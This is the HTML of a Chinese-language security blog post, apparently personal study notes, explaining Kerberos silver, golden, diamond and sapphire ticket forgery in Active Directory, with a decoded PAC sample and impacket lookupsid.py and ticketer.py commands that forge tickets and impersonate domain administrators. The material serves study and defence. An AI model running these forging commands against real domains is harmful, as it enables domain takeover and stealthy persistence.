@@ -1,0 +1,235 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>forgetickets | sU94r's blog</title><meta name="author" content="j499er"><meta name="copyright" content="j499er"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="目录 白银票据 黄金票据 钻石票据 蓝宝石票据  白银票据白银票据需要满足以下条件：1.获取一个具有SPN的账户的NT HASH或者key2.提供服务的主机对访问该SPN的PAC中用krbtgt签名的部分不会做验证，或者该SPN账户具有SeTcbPrivilege的权限(内建服务账户默认不做验证，如SYSTEM) 当满足上述条件后就可以伪造PAC来达到任意账户对该服务的完全访问权限，原理是PAC是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="forgetickets">
+<meta property="og:url" content="https://noobctfer.github.io/2025/02/17/forgetickets/index.html">
+<meta property="og:site_name" content="sU94r&#39;s blog">
+<meta property="og:description" content="目录 白银票据 黄金票据 钻石票据 蓝宝石票据  白银票据白银票据需要满足以下条件：1.获取一个具有SPN的账户的NT HASH或者key2.提供服务的主机对访问该SPN的PAC中用krbtgt签名的部分不会做验证，或者该SPN账户具有SeTcbPrivilege的权限(内建服务账户默认不做验证，如SYSTEM) 当满足上述条件后就可以伪造PAC来达到任意账户对该服务的完全访问权限，原理是PAC是">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://noobctfer.github.io/img/pika.png">
+<meta property="article:published_time" content="2025-02-17T04:12:17.000Z">
+<meta property="article:modified_time" content="2025-02-17T13:31:52.208Z">
+<meta property="article:author" content="j499er">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://noobctfer.github.io/img/pika.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://noobctfer.github.io/2025/02/17/forgetickets/index.html"><link rel="preconnect" href="//unpkg.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://unpkg.com/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'forgetickets',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/pika.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-inbox"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/categories/resources"><i class="fa-fw fas fa-download"></i><span> 资源</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/background.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/pika.png" alt="Logo"><span class="site-name">sU94r's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">forgetickets</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-inbox"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/categories/resources"><i class="fa-fw fas fa-download"></i><span> 资源</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">forgetickets</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-17T04:12:17.000Z" title="发表于 2025-02-17 12:12:17">2025-02-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-17T13:31:52.208Z" title="更新于 2025-02-17 21:31:52">2025-02-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/AD%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/">AD域渗透笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/2025/02/17/forgetickets/" data-flag-title="forgetickets"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2><span id="目录">目录</span></h2><ul>
+<li><a href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE">白银票据</a></li>
+<li><a href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE">黄金票据</a></li>
+<li><a href="#%E9%92%BB%E7%9F%B3%E7%A5%A8%E6%8D%AE">钻石票据</a></li>
+<li><a href="#%E8%93%9D%E5%AE%9D%E7%9F%B3%E7%A5%A8%E6%8D%AE">蓝宝石票据</a></li>
+</ul>
+<h2><span id="白银票据">白银票据</span></h2><p>白银票据需要满足以下条件：<br>1.获取一个具有SPN的账户的NT HASH或者key<br>2.提供服务的主机对访问该SPN的PAC中用krbtgt签名的部分不会做验证，或者该SPN账户具有SeTcbPrivilege的权限(内建服务账户默认不做验证，如SYSTEM)</p>
+<p>当满足上述条件后就可以伪造PAC来达到任意账户对该服务的完全访问权限，原理是PAC是用service account的凭证和KRBTGT账户的凭证双重签名的，并且PAC还会被用service account的凭证加密。但是某些服务并不会验证KRBTGT的签名部分，因此我们就可以伪造PAC.并且构造正确的加密结果，进而伪造高权限的ST。</p>
+<p>PAC的结构大致长这样：</p>
+<figure class="highlight plaintext"><figcaption><span>example</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">AuthorizationData item</span><br><span class="line">    ad-type: AD-Win2k-PAC (128)</span><br><span class="line">        Type: Logon Info (1)</span><br><span class="line">            PAC_LOGON_INFO: 01100800cccccccce001000000000000000002006a5c0818...</span><br><span class="line">                Logon Time: Aug 17, 2018 16:25:05.992202600 Romance Daylight Time</span><br><span class="line">                Logoff Time: Infinity (absolute time)</span><br><span class="line">                PWD Last Set: Aug 16, 2018 14:13:10.300710200 Romance Daylight Time</span><br><span class="line">                PWD Can Change: Aug 17, 2018 14:13:10.300710200 Romance Daylight Time</span><br><span class="line">                PWD Must Change: Infinity (absolute time)</span><br><span class="line">                Acct Name: pixis</span><br><span class="line">                Full Name: pixis</span><br><span class="line">                Logon Count: 7</span><br><span class="line">                Bad PW Count: 2</span><br><span class="line">                User RID: 1102</span><br><span class="line">                Group RID: 513</span><br><span class="line">                GROUP_MEMBERSHIP_ARRAY</span><br><span class="line">                    Referent ID: 0x0002001c</span><br><span class="line">                    Max Count: 2</span><br><span class="line">                    GROUP_MEMBERSHIP:</span><br><span class="line">                        Group RID: 1108</span><br><span class="line">                        Attributes: 0x00000007</span><br><span class="line">                            .... .... .... .... .... .... .... .1.. = Enabled: The enabled bit is SET</span><br><span class="line">                            .... .... .... .... .... .... .... ..1. = Enabled By Default: The ENABLED_BY_DEFAULT bit is SET</span><br><span class="line">                            .... .... .... .... .... .... .... ...1 = Mandatory: The MANDATORY bit is SET</span><br><span class="line">                    GROUP_MEMBERSHIP:</span><br><span class="line">                        Group RID: 513</span><br><span class="line">                        Attributes: 0x00000007</span><br><span class="line">                            .... .... .... .... .... .... .... .1.. = Enabled: The enabled bit is SET</span><br><span class="line">                            .... .... .... .... .... .... .... ..1. = Enabled By Default: The ENABLED_BY_DEFAULT bit is SET</span><br><span class="line">                            .... .... .... .... .... .... .... ...1 = Mandatory: The MANDATORY bit is SET</span><br><span class="line">                User Flags: 0x00000020</span><br><span class="line">                User Session Key: 00000000000000000000000000000000</span><br><span class="line">                Server: DC2016</span><br><span class="line">                Domain: HACKNDO</span><br><span class="line">                SID pointer:</span><br><span class="line">                    Domain SID: S-1-5-21-3643611871-2386784019-710848469  (Domain SID)</span><br><span class="line">                User Account Control: 0x00000210</span><br><span class="line">                    .... .... .... ...0 .... .... .... .... = Don&#x27;t Require PreAuth: This account REQUIRES preauthentication</span><br><span class="line">                    .... .... .... .... 0... .... .... .... = Use DES Key Only: This account does NOT have to use_des_key_only</span><br><span class="line">                    .... .... .... .... .0.. .... .... .... = Not Delegated: This might have been delegated</span><br><span class="line">                    .... .... .... .... ..0. .... .... .... = Trusted For Delegation: This account is NOT trusted_for_delegation</span><br><span class="line">                    .... .... .... .... ...0 .... .... .... = SmartCard Required: This account does NOT require_smartcard to authenticate</span><br><span class="line">                    .... .... .... .... .... 0... .... .... = Encrypted Text Password Allowed: This account does NOT allow encrypted_text_password</span><br><span class="line">                    .... .... .... .... .... .0.. .... .... = Account Auto Locked: This account is NOT auto_locked</span><br><span class="line">                    .... .... .... .... .... ..1. .... .... = Don&#x27;t Expire Password: This account DOESN&#x27;T_EXPIRE_PASSWORDs</span><br><span class="line">                    .... .... .... .... .... ...0 .... .... = Server Trust Account: This account is NOT a server_trust_account</span><br><span class="line">                    .... .... .... .... .... .... 0... .... = Workstation Trust Account: This account is NOT a workstation_trust_account</span><br><span class="line">                    .... .... .... .... .... .... .0.. .... = Interdomain trust Account: This account is NOT an interdomain_trust_account</span><br><span class="line">                    .... .... .... .... .... .... ..0. .... = MNS Logon Account: This account is NOT a mns_logon_account</span><br><span class="line">                    .... .... .... .... .... .... ...1 .... = Normal Account: This account is a NORMAL_ACCOUNT</span><br><span class="line">                    .... .... .... .... .... .... .... 0... = Temp Duplicate Account: This account is NOT a temp_duplicate_account</span><br><span class="line">                    .... .... .... .... .... .... .... .0.. = Password Not Required: This account REQUIRES a password</span><br><span class="line">                    .... .... .... .... .... .... .... ..0. = Home Directory Required: This account does NOT require_home_directory</span><br><span class="line">                    .... .... .... .... .... .... .... ...0 = Account Disabled: This account is NOT disabled</span><br></pre></td></tr></table></figure>
+
+<p>整个部分都是可以伪造的，并且在TGT和ST中都会存在,但是在白银票据中我们只能伪造ST，因为TGT的PAC部分是用KRBTGT的凭证加密的，我们没有办法构造加密后的内容。</p>
+<p>纵观攻击的步骤，我们全程是不和DC交互的，而是直接伪造ST和service请求服务，伪造的是ST，并且局限于只具有泄露密钥的服务账户的完整权限。</p>
+<p>UNIX命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#impacket script</span></span><br><span class="line"><span class="comment"># Find the domain SID</span></span><br><span class="line">lookupsid.py -hashes <span class="string">&#x27;LMhash:NThash&#x27;</span> <span class="string">&#x27;DOMAIN/DomainUser@DomainController&#x27;</span> 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># with an NT hash</span></span><br><span class="line">python ticketer.py -nthash <span class="string">&quot;<span class="variable">$NT_HASH</span>&quot;</span> -domain-sid <span class="string">&quot;<span class="variable">$DomainSID</span>&quot;</span> -domain <span class="string">&quot;<span class="variable">$DOMAIN</span>&quot;</span> -spn <span class="string">&quot;<span class="variable">$SPN</span>&quot;</span> <span class="string">&quot;username&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># with an AES (128 or 256 bits) key</span></span><br><span class="line">python ticketer.py -aesKey <span class="string">&quot;<span class="variable">$AESkey</span>&quot;</span> -domain-sid <span class="string">&quot;<span class="variable">$DomainSID</span>&quot;</span> -domain <span class="string">&quot;<span class="variable">$DOMAIN</span>&quot;</span> -spn <span class="string">&quot;<span class="variable">$SPN</span>&quot;</span> <span class="string">&quot;username&quot;</span></span><br></pre></td></tr></table></figure>
+<h2><span id="黄金票据">黄金票据</span></h2><p>伪造黄金票据只需要具有KRBTGT的NT HASH，得到这个后就可以构造正确的加密后的PAC和签名，然后就可以任意伪装自己的成员关系，并且获取对应的TGT。也就是说，黄金票据能够使我们获取对DC的完全控制</p>
+<p>UNIX命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#impacket script</span></span><br><span class="line"><span class="comment"># Find the domain SID</span></span><br><span class="line">lookupsid.py -hashes <span class="string">&#x27;LMhash:NThash&#x27;</span> <span class="string">&#x27;DOMAIN/DomainUser@DomainController&#x27;</span> 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create the golden ticket (with an RC4 key, i.e. NT hash)</span></span><br><span class="line">ticketer.py -nthash <span class="string">&quot;<span class="variable">$krbtgtNThash</span>&quot;</span> -domain-sid <span class="string">&quot;<span class="variable">$domainSID</span>&quot;</span> -domain <span class="string">&quot;<span class="variable">$DOMAIN</span>&quot;</span> <span class="string">&quot;randomuser&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create the golden ticket (with an AES 128/256bits key)</span></span><br><span class="line">ticketer.py -aesKey <span class="string">&quot;<span class="variable">$krbtgtAESkey</span>&quot;</span> -domain-sid <span class="string">&quot;<span class="variable">$domainSID</span>&quot;</span> -domain <span class="string">&quot;<span class="variable">$DOMAIN</span>&quot;</span> <span class="string">&quot;randomuser&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids</span></span><br><span class="line">ticketer.py -nthash <span class="string">&quot;<span class="variable">$krbtgtNThash</span>&quot;</span> -domain-sid <span class="string">&quot;<span class="variable">$domainSID</span>&quot;</span> -domain <span class="string">&quot;<span class="variable">$DOMAIN</span>&quot;</span> -user-id <span class="string">&quot;<span class="variable">$USERID</span>&quot;</span> -<span class="built_in">groups</span> <span class="string">&quot;<span class="variable">$GROUPID1</span>,<span class="variable">$GROUPID2</span>,...&quot;</span> <span class="string">&quot;randomuser&quot;</span></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://en.hackndo.com/kerberos-silver-golden-tickets/"><b>关于白银和黄金票据</b></a></p>
+<h3><span id="钻石票据">钻石票据</span></h3><p>钻石票据和黄金票据的区别就是黄金票据并不会真实地去请求TGT，整个TGT是完全伪装的，事先定好的，但是钻石票据是先正常请求TGT然后修改，之后用KRBTGT的long-term key重新加密和签名,钻石票据需要AES256 KEY</p>
+<p>UNIX命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#impacket script</span></span><br><span class="line">ticketer.py -request -domain <span class="string">&quot;<span class="variable">$DOMAIN</span>&quot;</span> -user <span class="string">&quot;<span class="variable">$USER</span>&quot;</span> -password <span class="string">&quot;<span class="variable">$PASSWORD</span>&quot;</span> -nthash <span class="string">&#x27;krbtgt/service NT hash&#x27;</span> -aesKey <span class="string">&#x27;krbtgt/service AES key&#x27;</span> -domain-sid <span class="string">&#x27;S-1-5-21-...&#x27;</span> -user-id <span class="string">&#x27;1337&#x27;</span> -<span class="built_in">groups</span> <span class="string">&#x27;512,513,518,519,520&#x27;</span> <span class="string">&#x27;baduser&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>NOTE:NO_AUTH_DATA_REQUIERED必须被设置为false，否则不会TGT或者ST不会有PAC</p>
+<h3><span id="蓝宝石票据">蓝宝石票据</span></h3><p>蓝宝石票据仍然需要KRBTGT的密钥，它的目的是获取一份高权限用户的PAC然后替换自己真实的PAC，用该密钥签名和加密修改后的TGT，之后就可以获取高权限。蓝宝石票据的好处是更难检测出来，因为PAC是真实存在的</p>
+<p>蓝宝石票据利用的是S4U2self和U2U，实际上被集成在一个TGS-REQ中，步骤是：<br>1.获取任意一个用户的NT hash，可以没有SPN(S4U2SELF不要求SPN，但是S4U2proxy要求)<br>2.用AS-REQ请求该用户的TGT<br>3.发起TGS-REQ，其中 PA_FOR_USER 包含要伪装的用户，sname是知道NT HASH的账户的saacountname，additional ticket部分是该账号的TGT(之前获取的)，ENC-TKT-IN-SKEY 设置为true(这样kdc会用该账户的TGT中包含的session key去加密PAC，我们就可以解密，是false的话则会使用伪装用户的session key，导致无法解密；这是U2U部分)<br>4.该S4U2self使得服务器返回要伪装用户的ST<br>5.解密获得伪装用户的PAC<br>6.把自己（具有NT hash的账户）TGT中的PAC替换成新的，然后用krbtgt的long-term key重新加密和计算签名</p>
+<p>附：U2U就是当一个账户A作为client，B作为server的时候，server没有A的NT HASH，因此B要想认证A的身份就需要通过U2U,即A正常请求ST，但是加密部分用的是B的TGT的session key，而不是A的，这样，B就可以解密并且验证ST</p>
+<p>UNIX命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ticketer.py -request -impersonate <span class="string">&#x27;domainadmin&#x27;</span> \</span><br><span class="line">-domain <span class="string">&#x27;DOMAIN.FQDN&#x27;</span> -user <span class="string">&#x27;domain_user&#x27;</span> -password <span class="string">&#x27;password&#x27;</span> \</span><br><span class="line">-nthash <span class="string">&#x27;krbtgt NT hash&#x27;</span> -aesKey <span class="string">&#x27;krbtgt AES key&#x27;</span> \</span><br><span class="line">-user-id <span class="string">&#x27;1115&#x27;</span> -domain-sid <span class="string">&#x27;S-1-5-21-...&#x27;</span> \</span><br><span class="line"><span class="string">&#x27;baduser&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>参考：<br><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire">1</a><br><a target="_blank" rel="noopener external nofollow noreferrer" href="https://unit42.paloaltonetworks.com/next-gen-kerberos-attacks/">2</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://noobctfer.github.io">j499er</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://noobctfer.github.io/2025/02/17/forgetickets/">https://noobctfer.github.io/2025/02/17/forgetickets/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://noobctfer.github.io" target="_blank">sU94r's blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/pika.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://unpkg.com/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://unpkg.com/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width no-desc" href="/2025/02/16/ntlmrelay/" title="ntlmrelay"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">ntlmrelay</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/pika.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">j499er</div><div class="author-info-description">Everything that kills me makes me feel alive</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/noobctfer"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/noobctfer" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">白银票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.1.</span> <span class="toc-text">钻石票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.2.</span> <span class="toc-text">蓝宝石票据</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/17/forgetickets/" title="forgetickets">forgetickets</a><time datetime="2025-02-17T04:12:17.000Z" title="发表于 2025-02-17 12:12:17">2025-02-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/16/ntlmrelay/" title="ntlmrelay">ntlmrelay</a><time datetime="2025-02-16T14:57:56.000Z" title="发表于 2025-02-16 22:57:56">2025-02-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/17/escapeTwo-writeup/" title="escapeTwo-writeup">escapeTwo-writeup</a><time datetime="2025-01-17T14:56:50.000Z" title="发表于 2025-01-17 22:56:50">2025-01-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/19/encoDecept-writeup/" title="encoDecept-writeup">encoDecept-writeup</a><time datetime="2024-12-19T03:19:01.000Z" title="发表于 2024-12-19 11:19:01">2024-12-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/18/breaking-bad-writeup/" title="breaking_bad-writeup">breaking_bad-writeup</a><time datetime="2024-12-18T06:15:21.000Z" title="发表于 2024-12-18 14:15:21">2024-12-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas 